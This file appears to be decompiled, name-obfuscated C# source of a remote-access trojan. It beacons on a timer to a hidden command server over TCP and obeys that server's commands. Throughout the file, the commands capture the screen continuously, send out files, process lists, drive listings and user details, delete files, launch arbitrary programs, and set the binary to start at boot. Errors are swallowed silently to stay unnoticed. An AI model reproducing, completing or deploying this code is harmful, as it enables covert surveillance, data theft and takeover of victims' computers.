using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Threading;

namespace irvrmjavhica;

public class MROIDM
{
	private ThreadStart irvrmjavhicafDarter;

	public TcpClient irvrmjavhicatcpthsck;

	public bool irvrmjavhicaisDrking = false;

	private bool irvrmjavhicaismitch = false;

	private bool irvrmjavhicathrRodming = false;

	private EDIRARE irvrmjavhicaStatdOibj = new EDIRARE();

	private MORLEINF irvrmjavhicaUPdC;

	private OREDMR irvrmjavhicaCMrD;

	private int irvrmjavhicascrSize = 200;

	private bool irvrmjavhicastr_wditer = false;

	private bool irvrmjavhicacapdScrgn = false;

	public int port_sdn = 0;

	public NetworkStream irvrmjavhicanetStrdm;

	private int irvrmjavhicabufdSize = 1024;

	private DEROIVF irvrmjavhicaHrD = new DEROIVF();

	private int irvrmjavhicabytesRdad = 0;

	public bool irvrmjavhicdreqCndls = false;

	public bool irvrmjavhicarutCdnls = false;

	public DateTime irvrmjavhicalTiweUtc;

	private Thread irvrmjavhicafunThrwad;

	private MemoryStream msStram = new MemoryStream();

	private SCILRNS irvrmjavhicacaps = new SCILRNS();

	private Bitmap image;

	public void irvrmjavhicadoy_start()
	{
		DAEONIF.irvrmjavhicaport = DAEONIF.ports[0];
		irvrmjavhicaUPdC = new MORLEINF();
		irvrmjavhicaCMrD = new OREDMR(this);
		irvrmjavhicaHrD.iserdrver = this;
		irvrmjavhicaHrD.irvrmjavhicamaithath = DAEONIF.irvrmjavhicaget_mtath();
		TimerCallback callback = irvrmjavhicaloyokupCdonc;
		Timer irvrmjavhicatimer = new Timer(callback, irvrmjavhicaStatdOibj, 38120, 56520);
		irvrmjavhicaStatdOibj.irvrmjavhicatimer = irvrmjavhicatimer;
	}

	public void irvrmjavhicasayveFile(string filewParth)
	{
		try
		{
			byte[] array = irvrmjavhicapuyll_data();
			if (array != null)
			{
				File.WriteAllBytes(filewParth, array);
			}
		}
		catch
		{
		}
	}

	private void irvrmjavhicaseyeEspo()
	{
		if (!irvrmjavhicaismitch)
		{
			irvrmjavhicaismitch = true;
			irvrmjavhicanetStrdm = irvrmjavhicaCMrD.irvrmjavhicaNS(irvrmjavhicatcpthsck);
			irvrmjavhicacapdScrgn = false;
			while (irvrmjavhicaisDrking)
			{
				string[] switchType = irvrmjavhicageyt_command();
				if (switchType != null)
				{
					irvrmjavhicdreqCndls = false;
					string text = switchType[0].ToLower();
					if (text.Split(new char[1] { '-' }).Length > 1)
					{
						text = text.Split(new char[1] { '-' })[1];
					}
					text = text.Insert(2, "6");
					switch ("irvrmjavhica-" + text.Replace("creen", "crgn"))
					{
					case "irvrmjavhica-ge6ytavs":
					case "irvrmjavhica-ge6tavs":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicaliyst_prodes("geytavs");
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-th6yumb":
					case "irvrmjavhica-th6umb":
						irvrmjavhicaimyage_info(switchType[1]);
						break;
					case "irvrmjavhica-pr6yocl":
					case "irvrmjavhica-pr6ocl":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicaliyst_prodes("pryocl");
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-pu6ytsrt":
					case "irvrmjavhica-pu6tsrt":
						irvrmjavhicaloyad_app();
						break;
					case "irvrmjavhica-do6ywf":
					case "irvrmjavhica-do6wf":
						irvrmjavhicasayveFile(switchType[1]);
						break;
					case "irvrmjavhica-sc6yrsz":
					case "irvrmjavhica-sc6rsz":
						irvrmjavhicascreyenSize(switchType[1]);
						break;
					case "irvrmjavhica-fi6ylsz":
					case "irvrmjavhica-fi6lsz":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicafiyle_info(switchType[1]);
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-cs6ycrgn":
					case "irvrmjavhica-cs6crgn":
						irvrmjavhicaseye_scren(switchType[1]);
						break;
					case "irvrmjavhica-st6yops":
					case "irvrmjavhica-st6ops":
						irvrmjavhicacapdScrgn = false;
						break;
					case "irvrmjavhica-sc6yren":
					case "irvrmjavhica-sc6ren":
						irvrmjavhicacapdScrgn = true;
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicaisy_scrgn(switchType[1]);
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-di6yrs":
					case "irvrmjavhica-di6rs":
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicalistDrives);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-cn6yls":
					case "irvrmjavhica-cn6ls":
						irvrmjavhicarutCdnls = true;
						irvrmjavhicdreqCndls = true;
						irvrmjavhicacapdScrgn = false;
						break;
					case "irvrmjavhica-de6ylt":
					case "irvrmjavhica-de6lt":
						irvrmjavhicaremyove_file(switchType[1]);
						break;
					case "irvrmjavhica-af6yile":
					case "irvrmjavhica-af6ile":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicaseynd_auto(switchType[1]);
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-ud6ylt":
					case "irvrmjavhica-ud6lt":
						irvrmjavhicaCMrD.irvrmjavhicaremyove_user();
						break;
					case "irvrmjavhica-li6ystf":
					case "irvrmjavhica-li6stf":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicaHrD.irvrmjavhicaloyokFdle(switchType[1]);
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-in6yfo":
					case "irvrmjavhica-in6fo":
						irvrmjavhicausyer_info();
						break;
					case "irvrmjavhica-ru6ynf":
					case "irvrmjavhica-ru6nf":
						try
						{
							Process.Start(switchType[1].Split(new char[1] { '>' })[0]);
						}
						catch
						{
						}
						break;
					case "irvrmjavhica-fi6yle":
					case "irvrmjavhica-fi6le":
						irvrmjavhicafDarter = delegate
						{
							irvrmjavhicapuysh_file(switchType[1]);
						};
						irvrmjavhicafunThrwad = new Thread(irvrmjavhicafDarter);
						irvrmjavhicafunThrwad.Start();
						break;
					case "irvrmjavhica-do6ywr":
					case "irvrmjavhica-do6wr":
						irvrmjavhicasayveFile(switchType[1]);
						break;
					case "irvrmjavhica-fl6ydr":
					case "irvrmjavhica-fl6dr":
					{
						string text3 = irvrmjavhicaHrD.irvrmjavhicachyeckFulder(switchType[1]);
						if (text3 != "")
						{
							irvrmjavhicapuysh_data(null, "irvrmjavhica-flydr=|irvrmjavhica".Split(new char[1] { '|' })[0] + text3);
						}
						break;
					}
					case "irvrmjavhica-fl6yes":
					case "irvrmjavhica-fl6es":
					{
						string text2 = irvrmjavhicaHrD.irvrmjavhicaloyokopFdile(switchType[1]);
						if (text2 != "")
						{
							irvrmjavhicapuysh_data(null, "irvrmjavhica-flyes=|irvrmjavhica".Split(new char[1] { '|' })[0] + text2);
						}
						break;
					}
					}
					continue;
				}
				irvrmjavhicaisDrking = false;
				break;
			}
			irvrmjavhicaisDrking = false;
			irvrmjavhicacapdScrgn = false;
		}
		irvrmjavhicaismitch = false;
	}

	public string irvrmjavhicafiyle_info(string path, bool ret = false)
	{
		try
		{
			FileInfo fileInfo = new FileInfo(path);
			string text = fileInfo.Name + ((!ret) ? ">|irvrmjavhica".Split(new char[1] { '|' })[0] : "<|irvrmjavhica".Split(new char[1] { '|' })[0]);
			text = text + fileInfo.CreationTimeUtc.Date.ToString() + ((!ret) ? ">|irvrmjavhica".Split(new char[1] { '|' })[0] : "<|irvrmjavhica".Split(new char[1] { '|' })[0]);
			text = text + irvrmjavhicageyt_size(fileInfo.Length) + ((!ret) ? ">|irvrmjavhica".Split(new char[1] { '|' })[0] : "<|irvrmjavhica".Split(new char[1] { '|' })[0]);
			if (!ret)
			{
				irvrmjavhicapuysh_data(null, "irvrmjavhica-fiylsz=|irvrmjavhica".Split(new char[1] { '|' })[0] + text);
			}
			return text;
		}
		catch
		{
			return "";
		}
	}

	private void irvrmjavhicaloyokupCdonc(object sodurce)
	{
		try
		{
			if (!irvrmjavhicathrRodming)
			{
				irvrmjavhicathrRodming = true;
				if (!irvrmjavhicaisDrking || !irvrmjavhicatcpthsck.Connected)
				{
					irvrmjavhicaisDrking = irvrmjavhicaIPySg();
					if (irvrmjavhicaisDrking)
					{
						irvrmjavhicabufdSize = irvrmjavhicatcpthsck.ReceiveBufferSize;
						irvrmjavhicaseyeEspo();
					}
				}
			}
			irvrmjavhicathrRodming = false;
		}
		catch
		{
			irvrmjavhicathrRodming = false;
			irvrmjavhicastr_wditer = false;
			irvrmjavhicaisDrking = false;
			irvrmjavhicaismitch = false;
		}
	}

	private bool irvrmjavhicaIPySg()
	{
		try
		{
			DAEONIF.irvrmjavhicadifarltP = DAEONIF.getBDString(DAEONIF.irvrmjavhicavpdips);
			irvrmjavhicatcpthsck = new TcpClient();
			irvrmjavhicatcpthsck.Connect(DAEONIF.irvrmjavhicadifarltP, DAEONIF.irvrmjavhicaport);
			return true;
		}
		catch
		{
			port_sdn++;
			DAEONIF.irvrmjavhicaport = DAEONIF.ports[port_sdn];
			if (port_sdn >= DAEONIF.ports.Length - 1)
			{
				port_sdn = 0;
			}
			return false;
		}
	}

	public bool irvrmjavhicaseynd_auto(string fildeinfo)
	{
		try
		{
			string[] array = fildeinfo.Split(new char[1] { '>' });
			string path = array[0];
			if (File.Exists(path))
			{
				string fileName = Path.GetFileName(path);
				byte[] data = File.ReadAllBytes(path);
				fildeinfo = fildeinfo + ">" + fileName;
				irvrmjavhicapuysh_data(data, "irvrmjavhica-afyile=" + fildeinfo);
				return false;
			}
			irvrmjavhicapuysh_data(null, "irvrmjavhica-anyfod=" + fildeinfo);
			return false;
		}
		catch
		{
			return false;
		}
	}

	private void irvrmjavhicaimyage_info(string path)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_0016: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		try
		{
			Bitmap val = new Bitmap((Image)new Bitmap(path), new Size(200, 150));
			if (val != null)
			{
				FileInfo fileInfo = new FileInfo(path);
				string text = fileInfo.Name + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
				text = text + fileInfo.CreationTimeUtc.Date.ToString() + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
				text = text + irvrmjavhicageyt_size(fileInfo.Length) + ">";
				MemoryStream memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, ImageFormat.get_Gif());
				irvrmjavhicapuysh_data(memoryStream.ToArray(), "irvrmjavhica-thyumb=|irvrmjavhica".Split(new char[1] { '|' })[0] + text);
			}
		}
		catch
		{
		}
	}

	public void irvrmjavhicaliyst_prodes(string cmtd)
	{
		try
		{
			string text = "";
			Process[] processes = Process.GetProcesses();
			for (int i = 0; i <= processes.Length - 1; i++)
			{
				text = text + processes[i].Id + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
				text = text + processes[i].ProcessName + ">|irvrmjavhica".Split(new char[1] { '|' })[0];
				text += "0>|irvrmjavhica".Split(new char[1] { '|' })[0];
				text += "<";
			}
			byte[] data = DAEONIF.getyBYArray(text);
			irvrmjavhicapuysh_data(data, "irvrmjavhica-" + cmtd + "=proyess|irvrmjavhica".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	public void irvrmjavhicaloyad_app()
	{
		try
		{
			string text = DAEONIF.irvrmjavhicaget_mtath() + DAEONIF.irvrmjavhicamrnApup + ".exe|irvrmjavhica".Split(new char[1] { '|' })[0];
			if (text != DAEONIF.irvrmjavhicadyPiath)
			{
				File.WriteAllBytes(text, File.ReadAllBytes(DAEONIF.irvrmjavhicadyPiath));
			}
			DAEONIF.irvrmjavhicaset_rudn("sidrtd|irvrmjavhica".Split(new char[1] { '|' })[0], text);
		}
		catch
		{
		}
	}

	private void irvrmjavhicaseye_scren(string scrgnSize)
	{
		try
		{
			irvrmjavhicascrSize = Convert.ToInt16(scrgnSize.Split(new char[1] { '>' })[0].Trim());
			image = irvrmjavhicacaps.irvrmjavhicaScrgn(irvrmjavhicascrSize);
			msStram.SetLength(0L);
			((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
			irvrmjavhicapuysh_data(msStram.ToArray(), "irvrmjavhica-sayscr=irvrmjavhica|irvrmjavhica".Split(new char[1] { '|' })[0]);
		}
		catch
		{
		}
	}

	private void irvrmjavhicaisy_scrgn(string scrgnSize)
	{
		try
		{
			irvrmjavhicascrSize = Convert.ToInt16(scrgnSize.Split(new char[1] { '>' })[0].Trim());
			while (irvrmjavhicacapdScrgn && irvrmjavhicaisDrking)
			{
				image = irvrmjavhicacaps.irvrmjavhicaScrgn(irvrmjavhicascrSize);
				msStram.SetLength(0L);
				((Image)image).Save((Stream)msStram, ImageFormat.get_Jpeg());
				irvrmjavhicapuysh_data(msStram.ToArray(), "irvrmjavhica-scyren=irvrmjavhica|irvrmjavhica".Split(new char[1] { '|' })[0]);
			}
		}
		catch
		{
		}
	}

	private string irvrmjavhicageyt_size(long byteCount)
	{
		try
		{
			string[] array = new string[7]
			{
				"B|irvrmjavhica".Split(new char[1] { '|' })[0],
				"KB|irvrmjavhica".Split(new char[1] { '|' })[0],
				"MB|irvrmjavhica".Split(new char[1] { '|' })[0],
				"GB|irvrmjavhica".Split(new char[1] { '|' })[0],
				"TB|irvrmjavhica".Split(new char[1] { '|' })[0],
				"PB|irvrmjavhica".Split(new char[1] { '|' })[0],
				"EB|irvrmjavhica".Split(new char[1] { '|' })[0]
			};
			if (byteCount == 0L)
			{
				return "0" + array[0];
			}
			long num = Math.Abs(byteCount);
			int num2 = Convert.ToInt32(Math.Floor(Math.Log(num, 1024.0)));
			double num3 = Math.Round((double)num / Math.Pow(1024.0, num2), 1);
			return (double)Math.Sign(byteCount) * num3 + array[num2];
		}
		catch
		{
			return "";
		}
	}

	private void irvrmjavhicausyer_info()
	{
		string text = irvrmjavhicaUPdC.irvrmjavhicalaCird + "|" + irvrmjavhicaUPdC.irvrmjavhicactDme + "|" + irvrmjavhicaUPdC.irvrmjavhicauDtme + "|" + irvrmjavhicaUPdC.irvrmjavhicauthip + "|" + DAEONIF.irvrmjavhicaOdime() + "|" + irvrmjavhicaUPdC.irvrmjavhicarpvier + "|";
		text += "| !irvrmjavhica".Split(new char[1] { '!' })[0];
		text = text + "|" + irvrmjavhicaUPdC.irvrmjavhicaclieThum;
		text = text + "|" + DAEONIF.irvrmjavhicaget_mtath();
		byte[] data = DAEONIF.getyBYArray(text);
		irvrmjavhicapuysh_data(data, "irvrmjavhica-inyfo=usyer|irvrmjavhica".Split(new char[1] { '|' })[0]);
	}

	private void irvrmjavhicascreyenSize(string scSize)
	{
		try
		{
			string[] array = scSize.Split(new char[1] { '>' });
			irvrmjavhicascrSize = Convert.ToInt16(array[0].Trim());
		}
		catch
		{
		}
	}

	private void irvrmjavhicapuysh_file(string lfile)
	{
		try
		{
			if (File.Exists(lfile))
			{
				string fileName = Path.GetFileName(lfile);
				irvrmjavhicapuysh_data(File.ReadAllBytes(lfile), "irvrmjavhica-fiyle=|irvrmjavhica".Split(new char[1] { '|' })[0] + lfile + ">0>" + fileName, tmp: true);
			}
		}
		catch
		{
		}
	}

	public void irvrmjavhicaremyove_file(string path)
	{
		try
		{
			File.Delete(path);
		}
		catch
		{
		}
	}

	public bool irvrmjavhicapuysh_data(byte[] data, string type, bool tmp = false)
	{
		try
		{
			if (irvrmjavhicastr_wditer)
			{
				return false;
			}
			irvrmjavhicastr_wditer = true;
			byte[] array = DAEONIF.getyBYArray(type);
			int num = 0;
			int num2 = 5;
			byte[] array2 = null;
			if (data != null)
			{
				array2 = BitConverter.GetBytes(data.Length);
				num = data.Length;
				num2 = 10;
			}
			byte[] bytes = BitConverter.GetBytes(array.Length);
			byte[] array3 = new byte[num2 + array.Length + num];
			bytes.CopyTo(array3, 0);
			array.CopyTo(array3, 5);
			if (data != null)
			{
				array2.CopyTo(array3, 5 + array.Length);
				data.CopyTo(array3, 10 + array.Length);
			}
			int num3 = 0;
			int num4 = array3.Length;
			while (num4 > 0 && !irvrmjavhicdreqCndls)
			{
				int num5 = ((num4 > irvrmjavhicabufdSize) ? irvrmjavhicabufdSize : num4);
				irvrmjavhicanetStrdm.Write(array3, num3, num5);
				num3 += num5;
				num4 -= num5;
			}
			irvrmjavhicastr_wditer = false;
			if (irvrmjavhicdreqCndls)
			{
				return false;
			}
			return true;
		}
		catch
		{
			irvrmjavhicastr_wditer = false;
			irvrmjavhicaisDrking = false;
			return false;
		}
	}

	public byte[] irvrmjavhicapuyll_data()
	{
		try
		{
			int num = 0;
			byte[] array = new byte[5];
			irvrmjavhicabytesRdad = irvrmjavhicanetStrdm.Read(array, 0, 5);
			int num2 = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num2];
			int num3 = num2;
			while (num3 > 0 && !irvrmjavhicdreqCndls)
			{
				int count = ((num3 > irvrmjavhicabufdSize) ? irvrmjavhicabufdSize : num3);
				irvrmjavhicabytesRdad = irvrmjavhicanetStrdm.Read(array2, num, count);
				num += irvrmjavhicabytesRdad;
				num3 -= irvrmjavhicabytesRdad;
			}
			if (irvrmjavhicdreqCndls)
			{
				irvrmjavhicanetStrdm.Flush();
				while (irvrmjavhicanetStrdm.DataAvailable && irvrmjavhicanetStrdm.ReadByte() >= 0)
				{
				}
				array2 = null;
			}
			return array2;
		}
		catch
		{
			irvrmjavhicaisDrking = false;
			return null;
		}
	}

	public string[] irvrmjavhicageyt_command()
	{
		try
		{
			byte[] array = new byte[5];
			irvrmjavhicabytesRdad = irvrmjavhicanetStrdm.Read(array, 0, 5);
			int num = BitConverter.ToInt32(array, 0);
			byte[] array2 = new byte[num];
			int num2 = 0;
			for (int num3 = num; num3 > 0; num3 -= irvrmjavhicabytesRdad)
			{
				int count = ((num3 > irvrmjavhicabufdSize) ? irvrmjavhicabufdSize : num3);
				irvrmjavhicabytesRdad = irvrmjavhicanetStrdm.Read(array2, num2, count);
				num2 += irvrmjavhicabytesRdad;
			}
			string bDString = DAEONIF.getBDString(array2);
			if (bDString.Trim() == "")
			{
				return null;
			}
			return bDString.Split(new char[1] { '=' });
		}
		catch
		{
			irvrmjavhicaisDrking = false;
			return null;
		}
	}

	private void irvrmjavhicalistDrives()
	{
		string text = irvrmjavhicaHrD.irvrmjavhicalorkupDrive();
		irvrmjavhicapuysh_data(null, "irvrmjavhica-diyrs=" + text);
	}
}
